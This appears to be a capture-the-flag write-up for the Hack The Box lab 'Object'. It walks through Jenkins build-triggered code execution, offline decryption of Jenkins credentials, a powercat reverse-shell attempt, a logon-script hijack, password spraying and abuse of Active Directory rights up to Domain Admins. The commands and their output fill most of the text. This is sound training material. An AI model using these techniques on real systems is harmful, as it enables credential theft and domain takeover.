## Object

### Lab Details 

- Difficulty: Hard
- Type: Jenkins, AD, Windows

#### Enumeration
- run `nmap`
```bash
PORT     STATE SERVICE VERSION
80/tcp   open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Mega Engines
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8080/tcp open  http    Jetty 9.4.43.v20210629
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(9.4.43.v20210629)
| http-robots.txt: 1 disallowed entry 
|_/
```
port 80
	- found email
		- `ideas@object.htb`
	- found domain
		- `object.htb`
	- fuzz for files did not find anything useful
![[port 80 home page.png]]
port 8080
	- running `Jenkins`
	- we are allowed to create a new account
	- `Jenkins` version `2.317`
![[jenkins on port 8080.png]]
- fuzz for files
 ```
 $ ffuf -u http://object.htb:8080/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt -fc 403

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://object.htb:8080/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 403
________________________________________________

logout                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 9ms]
login                   [Status: 200, Size: 2120, Words: 208, Lines: 11, Duration: 235ms]
assets                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 20ms]
signup                  [Status: 200, Size: 7937, Words: 3393, Lines: 83, Duration: 17ms]
oops                    [Status: 200, Size: 6552, Words: 241, Lines: 9, Duration: 30ms]
git                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 189ms]
cli                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 9ms]
accessDenied            [Status: 200, Size: 6309, Words: 225, Lines: 9, Duration: 163ms]
loginError              [Status: 401, Size: 2186, Words: 213, Lines: 11, Duration: 226ms]
 ``` 
- nothing useful was found from the fuzz, there is `cli` however we cannot access is via the web
![[generate api token on jenkins.png]]
- once we have the token, we can attempt to trigger a build 
```bash
$  curl -X POST -L --user "attacker:1115a268595231f652d03f6502cf0be4f1" \ "http://10.129.3.244:8080/job/test/build token=1115a268595231f652d03f6502cf0be4f1"
```
- we get a build history
![[failed to build.png]]
- unable to get a reverse shell via the `build` due to limited network connection to external networks
![[access to external ip is disabled.png]]
- we get forbidden to external network error
![[check output from build.png]]
- we also cannot download files from remote
- at least we can execute code, lets check for configs files 
- we can enumerate the target file system using powershell
```powershell
powershell ls 'c:\Users\oliver\Appdata\local\jenkins\'
```
![[checking for files via console output.png]]
```powershell
powershell ls 'c:\Users\oliver\Appdata\local\jenkins\.jenkins'
```
![[enumerating file system on target.png]]
```powershell
powershell ls 'c:\Users\oliver\Appdata\local\jenkins\.jenkins\users'
```
![[found admin dir on target file system.png]]
```powershell
powershell ls 'c:\Users\oliver\Appdata\local\jenkins\.jenkins\users\admin_17207690984073220035'
```
![[found config file for admin.png]]
```powershell
powershell cat 'c:\Users\oliver\Appdata\local\jenkins\.jenkins\users\admin_17207690984073220035\config.xml'
```
- below is the content of the `config.xml`, there are two passwords mentioned in the file
```xml
Started by remote host 10.10.14.82
Running as SYSTEM
Building in workspace C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\test
[test] $ cmd /c call C:\Users\oliver\AppData\Local\Temp\jenkins16898884693474757596.bat

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\test>powershell cat 'c:\Users\oliver\Appdata\local\jenkins\.jenkins\users\admin_17207690984073220035\config.xml' 
<?xml version='1.1' encoding='UTF-8'?>
<user>
  <version>10</version>
  <id>admin</id>
  <fullName>admin</fullName>
  <properties>
    <com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin="credentials@2.6.1">
      <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash">
        <entry>
          <com.cloudbees.plugins.credentials.domains.Domain>
            <specifications/>
          </com.cloudbees.plugins.credentials.domains.Domain>
          <java.util.concurrent.CopyOnWriteArrayList>
            <com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
              <id>320a60b9-1e5c-4399-8afe-44466c9cde9e</id>
              <description></description>
              <username>oliver</username>
              <password>{AQAAABAAAAAQqU+m+mC6ZnLa0+yaanj2eBSbTk+h4P5omjKdwV17vcA=}</password>
              <usernameSecret>false</usernameSecret>
            </com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
          </java.util.concurrent.CopyOnWriteArrayList>
        </entry>
      </domainCredentialsMap>
    </com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty>
    <hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty plugin="email-ext@2.84">
      <triggers/>
    </hudson.plugins.emailext.watching.EmailExtWatchAction_-UserProperty>
    <hudson.model.MyViewsProperty>
      <views>
        <hudson.model.AllView>
          <owner class="hudson.model.MyViewsProperty" reference="../../.."/>
          <name>all</name>
          <filterExecutors>false</filterExecutors>
          <filterQueue>false</filterQueue>
          <properties class="hudson.model.View$PropertyList"/>
        </hudson.model.AllView>
      </views>
    </hudson.model.MyViewsProperty>
    <org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin="display-url-api@2.3.5">
      <providerId>default</providerId>
    </org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty>
    <hudson.model.PaneStatusProperties>
      <collapsed/>
    </hudson.model.PaneStatusProperties>
    <jenkins.security.seed.UserSeedProperty>
      <seed>ea75b5bd80e4763e</seed>
    </jenkins.security.seed.UserSeedProperty>
    <hudson.search.UserSearchProperty>
      <insensitiveSearch>true</insensitiveSearch>
    </hudson.search.UserSearchProperty>
    <hudson.model.TimeZoneProperty/>
    <hudson.security.HudsonPrivateSecurityRealm_-Details>
      <passwordHash>#jbcrypt:$2a$10$q17aCNxgciQt8S246U4ZauOccOY7wlkDih9b/0j4IVjZsdjUNAPoW</passwordHash>
    </hudson.security.HudsonPrivateSecurityRealm_-Details>
    <hudson.tasks.Mailer_-UserProperty plugin="mailer@1.34">
      <emailAddress>admin@object.local</emailAddress>
    </hudson.tasks.Mailer_-UserProperty>
    <jenkins.security.ApiTokenProperty>
      <tokenStore>
        <tokenList/>
      </tokenStore>
    </jenkins.security.ApiTokenProperty>
    <jenkins.security.LastGrantedAuthoritiesProperty>
      <roles>
        <string>authenticated</string>
      </roles>
      <timestamp>1634793332195</timestamp>
    </jenkins.security.LastGrantedAuthoritiesProperty>
  </properties>
</user>

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\test>exit 0 
Finished: SUCCESS
```
- we can use[ `jenkins_offline_decrypt.py`](https://raw.githubusercontent.com/gquere/pwn_jenkins/master/offline_decryption/jenkins_offline_decrypt.py) to get the plain text but first we need to get the key and util file 
```powershell
powershell cat 'c:\Users\oliver\Appdata\local\jenkins\.jenkins\secrets\master.key'

powershell.exe -c "$c=[convert]::ToBase64String((Get-Content -path 'c:\Users\oliver\Appdata\local\jenkins\.jenkins\secrets\hudson.util.Secret' -Encoding byte));Write-Output $c"
```
- trigger for build once more 
```powershell
Started by remote host 10.10.14.82
Running as SYSTEM
Building in workspace C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\test
[test] $ cmd /c call C:\Users\oliver\AppData\Local\Temp\jenkins7591958428255826123.bat

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\test>powershell cat 'c:\Users\oliver\Appdata\local\jenkins\.jenkins\secrets\master.key' 
f673fdb0c4fcc339070435bdbe1a039d83a597bf21eafbb7f9b35b50fce006e564cff456553ed73cb1fa568b68b310addc576f1637a7fe73414a4c6ff10b4e23adc538e9b369a0c6de8fc299dfa2a3904ec73a24aa48550b276be51f9165679595b2cac03cc2044f3c702d677169e2f4d3bd96d8321a2e19e2bf0c76fe31db19

C:\Users\oliver\AppData\Local\Jenkins\.jenkins\workspace\test>powershell.exe -c "$c=[convert]::ToBase64String((Get-Content -path 'c:\Users\oliver\Appdata\local\jenkins\.jenkins\secrets\hudson.util.Secret' -Encoding byte));Write-Output $c" 
gWFQFlTxi+xRdwcz6KgADwG+rsOAg2e3omR3LUopDXUcTQaGCJIswWKIbqgNXAvu2SHL93OiRbnEMeKqYe07PqnX9VWLh77Vtf+Z3jgJ7sa9v3hkJLPMWVUKqWsaMRHOkX30Qfa73XaWhe0ShIGsqROVDA1gS50ToDgNRIEXYRQWSeJY0gZELcUFIrS+r+2LAORHdFzxUeVfXcaalJ3HBhI+Si+pq85MKCcY3uxVpxSgnUrMB5MX4a18UrQ3iug9GHZQN4g6iETVf3u6FBFLSTiyxJ77IVWB1xgep5P66lgfEsqgUL9miuFFBzTsAkzcpBZeiPbwhyrhy/mCWogCddKudAJkHMqEISA3et9RIgA=
```
- decode the `hudson.util.Secret` using `base64` and save it to file
```bash
$ cat hudson.util.Secret.bak| base64 -d > hudson.util.Secret
```
- run decryptor 
```bash
$ jenkins-decryptor ./master.key ./hudson.util.Secret ./credentials.xml

credentials.decrypted.xml
```
- we get the plain text password in the decrypted `xml` file
```xml
$ cat credentials.decrypted.xml                             
<?xml version='1.1' encoding='UTF-8'?>
<user>
  <version>10</version>
  <id>admin</id>
  <fullName>admin</fullName>
  <properties>
    <com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin="credentials@2.6.1">
      <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash">
        <entry>
          <com.cloudbees.plugins.credentials.domains.Domain>
            <specifications/>
          </com.cloudbees.plugins.credentials.domains.Domain>
          <java.util.concurrent.CopyOnWriteArrayList>
            <com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
              <id>320a60b9-1e5c-4399-8afe-44466c9cde9e</id>
              <description></description>
              <username>oliver</username>
              <password>c1cdfun_d2434</password>
<SNIP>
```
#### Initial Foothold 
- check if we have `winrm` access as `oliver` on target with `nxc`
```bash
$ nxc winrm 10.129.3.244 -u oliver -p c1cdfun_d2434
WINRM       10.129.3.244    5985   JENKINS          [*] Windows 10 / Server 2019 Build 17763 (name:JENKINS) (domain:object.local)
WINRM       10.129.3.244    5985   JENKINS          [+] object.local\oliver:c1cdfun_d2434 (Pwn3d!)
```
- use `evil-winrm` to get shell access
- check `/home`, there are couple users 
```bash
*Evil-WinRM* PS C:\Users> ls


    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/10/2021   3:20 AM                Administrator
d-----       10/26/2021   7:59 AM                maria
d-----       10/26/2021   7:58 AM                oliver
d-r---        4/10/2020  10:49 AM                Public
d-----       10/21/2021   3:44 AM                smith

```
#### Lateral Movement (If any)
- upload `sharphound` via `evil-winrm`, download digest and upload to bloodhound
![[bloodhound oliver.png]]
- we see that `oiver` has `ForceChangePassword` right over `smith`
```powershell
*Evil-WinRM* PS C:\Users\oliver> $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\oliver> $SecPassword = ConvertTo-SecureString 'c1cdfun_d2434' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\oliver> $Cred = New-Object System.Management.Automation.PSCredential ('oliver', $SecPassword)
*Evil-WinRM* PS C:\Users\oliver>  Set-DomainUserPassword -Identity smith -AccountPassword $UserPassword -Credential $Cred
```
- we can login as smith with the new password
```bash
$ nxc winrm 10.129.3.244 -u smith -p 'Password123!'
WINRM       10.129.3.244    5985   JENKINS          [*] Windows 10 / Server 2019 Build 17763 (name:JENKINS) (domain:object.local)
WINRM       10.129.3.244    5985   JENKINS          [+] object.local\smith:Password123! (Pwn3d!)
```
- check smith's rights on `bloodhound` , `smith` has `GenericWrite` right over `maria`
![[bloodhound smith.png]]
- attempt with targeted `kerberos` attacker against `maria` however unable crack the password
- we can attempt to update the logon script for Maria and whenever user logs the script gets executed
- we want to get a reverse shell from the login script 
- **NOTE** - below attempt did not work, cannot get a reverse shell as `maria`
- first download `powercat.ps1` & `nc64.exe`
```powershell
wget https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.s1
```
- then append the reverse shell command to `powercat`
``` powershell

echo 'powercat -c 127.0.0.1 -p 1234 -e cmd' >> powercat.ps1
```
- set the logon script location at `C:\\Windows\\System32\\spool\\drivers\\color\\`
``` powershell
Set-DomainObject -Identity maria -SET @{scriptpath="C:\\Windows\\System32\\spool\\drivers\\color\\powercat.ps1"}
```
-  did some testing unable to get reverse shell as `maria`
- alternatively we can enumerate `maria`'s home directory and see if there's anything useful
```powershell
*Evil-WinRM* PS C:\programdata>  echo "ls \users\maria\ > \programdata\out" > cmd.ps1
*Evil-WinRM* PS C:\programdata> Set-DomainObject -Identity maria -SET @{scriptpath="C:\\programdata\\cmd.ps1"}

*Evil-WinRM* PS C:\programdata> cat out


    Directory: C:\users\maria


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---       10/22/2021   3:54 AM                3D Objects
d-r---       10/22/2021   3:54 AM                Contacts
d-r---       10/25/2021   3:47 AM                Desktop
d-r---       10/25/2021  10:07 PM                Documents
d-r---       10/22/2021   3:54 AM                Downloads
d-r---       10/22/2021   3:54 AM                Favorites
d-r---       10/22/2021   3:54 AM                Links
d-r---       10/22/2021   3:54 AM                Music
d-r---       10/22/2021   3:54 AM                Pictures
d-r---       10/22/2021   3:54 AM                Saved Games
d-r---       10/22/2021   3:54 AM                Searches
d-r---       10/22/2021   3:54 AM                Videos

*Evil-WinRM* PS C:\programdata>  echo "ls \users\maria\Desktop > \programdata\out" > cmd.ps1

*Evil-WinRM* PS C:\programdata> cat out


    Directory: C:\users\maria\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/26/2021   8:13 AM           6144 Engines.xls

```
- found `Engines.xls` excel file
- we can grab  it by encoding it with `base64` and output it to terminal
```powershell 
## using base64 encode 
*Evil-WinRM* PS C:\programdata> echo '[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\users\maria\Desktop\Engines.xls")) > "C:\programdata\out"' > cmd.ps1

*Evil-WinRM* PS C:\programdata> cat out
0M8R4KGxGuEAAAAAAAAAAAAAAAAAAAAAOwADAP7/CQAGAAAAAAAAAAAAAAABAAAACQAAAAAAAAAAEAAAAgAAAAEAAAD+////AAAAAAAAAAD/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
<SNIP>
```
- decode from `base64` 
```
## decode from base64
$ cat engines.xls.bak | base64 -d > engines.xls
```
- open the file and we get passwords for user `maria`
![[Engines xls.png]]
- below are the passwords
```
Name	Quantity	Date Acquired	Owner	Chamber Username	Chamber Password
Internal Combustion Engine	12	10/02/21	HTB	maria	d34gb8@
Stirling Engine	23	11/05/21	HTB	maria	0de_434_d545
Diesel Engine	4	02/03/21	HTB	maria	W3llcr4ft3d_4cls
```
- spray the passwords and found valid credential for `maria`
```bash
$ crackmapexec winrm 10.129.32.177 -u maria -p passwords.txt --verbose
[09:20:08] INFO     Socket info: host=10.129.32.177, hostname=10.129.32.177, kerberos=False, ipv6=False, link-local ipv6=False                         connection.py:160
WINRM       10.129.32.177   5985   JENKINS          [*] Windows 10 / Server 2019 Build 17763 (name:JENKINS) (domain:object.local)
WINRM       10.129.32.177   5985   JENKINS          [-] object.local\maria:0de_434_d545
WINRM       10.129.32.177   5985   JENKINS          [-] object.local\maria:d34gb8@
WINRM       10.129.32.177   5985   JENKINS          [+] object.local\maria:W3llcr4ft3d_4cls (Pwn3d!)
```
#### Privilege Escalation
- check `maria`'s rights on bloodhound, `maria` has `WriteOwner` over `Domain Admins` group
![[bloodhound maria.png]]
- we can abuse this by setting the group owner to `maria` then adding `maria` to the `Domain Admin` group
```powershell
Evil-WinRM* PS C:\Users\maria\Documents> Set-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity 'maria'
*Evil-WinRM* PS C:\Users\maria\Documents> Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity maria -Rights All
*Evil-WinRM* PS C:\Users\maria\Documents> Add-DomainGroupMember -Identity 'Domain Admins' -Members 'maria'
*Evil-WinRM* PS C:\Users\maria\Documents> net user maria
User name                    maria
Full Name                    maria garcia
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/21/2021 9:16:32 PM
Password expires             Never
Password changeable          10/22/2021 9:16:32 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/29/2025 7:20:14 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Admins        *Domain Users
The command completed successfully.
```
- `evil-winrm` as `maria` again and we can access admin user's home directory

#### Resources

#### Lesson Learned
